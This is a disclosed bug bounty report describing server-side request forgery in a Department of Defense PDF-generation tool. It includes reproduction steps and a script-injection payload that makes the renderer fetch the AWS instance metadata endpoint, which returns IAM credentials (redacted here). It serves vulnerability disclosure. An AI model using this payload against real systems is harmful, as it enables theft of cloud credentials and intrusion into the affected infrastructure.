# SSRF in Functional Administrative Support Tool pdf generator (████) [HtUS]

## Report Details
- **Report ID**: 1628209
- **URL**: https://hackerone.com/reports/1628209
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2022-07-06T14:31:26.439Z
- **Disclosed**: 2022-09-14T21:00:36.641Z

## Reporter
- **Username**: codeprivate
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
## Summary:
I found that it is possible to inject a javascript payload during the PDF form creation process, which is then executed by the checklist application server.

## Vulnerable Software: Functional Administrative Support Tool (FAST) v1.0

## Intro: 

██████████

Administrative clerks create a dynamic action items by guiding a███ through targeted questions designed to draw out required administrative actions that are required and trigger of additional processes that need to be completed.

After completing the question and answer process ( point 3. Get Action Items ) the application offers 2 options: Send the report by Email or print (See PDF).

When the user clicks on (View PDF) they are redirected to the URL:███████/print/checklist/fast_session_XXXXXX.pdf . This is where the user will have access to his PDF form generated dynamically by the███ system.

note: XXXXXX is the "session" assigned by the system to identify a form.

## Steps To Reproduce:
1. Go to███/ and select "BEGIN NEW SESSION", enter a MCC code Ex. "h99" and SUBMIT
2. with burp suite on, select a process, and fill in the data randomly up to point 3. (EDIPI code is a 10 chars long number. Ex. 0123456789) - click CONTINUE

3. in point 3, (Get Action Items) click on PRINT (VIEW PDF) - A window will open with the dynamically generated PDF exposing the data that we complete.

4. observe in burp suite the last request made to /api/save/ proceed to right click and send to "Repeater"

5. modify value "name" of the json object "globalInfo" by the payload:

`</script><script>document.write('<iframe src=\"http://███/latest/meta-data/iam/security-credentials/EC2CloudWatchRole\" width=1000px height=1000px>')</script>`

and click Send request. If everything went well, the server responds "status ok"

6. Refresh form URL. Ex.████████/print/checklist/fast_session_XXXXXX.pdf

for this PoC. AWS secretkeys were accessed:

`{  "Code" : "Success",  "LastUpdated" : "2022-07-06T02:57:53Z",  "Type" : "AWS-HMAC",  "AccessKeyId" : "███",  "SecretAccessKey" : "████",  "Token" :"██████",  "Expiration" : "2022-07-06T09:04:49Z"}`

## Supporting Material/References:

* https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
* https://docs.google.com/presentation/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/htmlpresent
* https://hackerone.com/reports/508459
* https://hackerone.com/reports/53088

## Impact

An attacker can inject malicious javascript payloads in the PDF generation process and executed by the checklist application server. An attacker could use this to Steal  credentials or other sensitive information from ████ AWS Instance.

## Attachments
No attachments
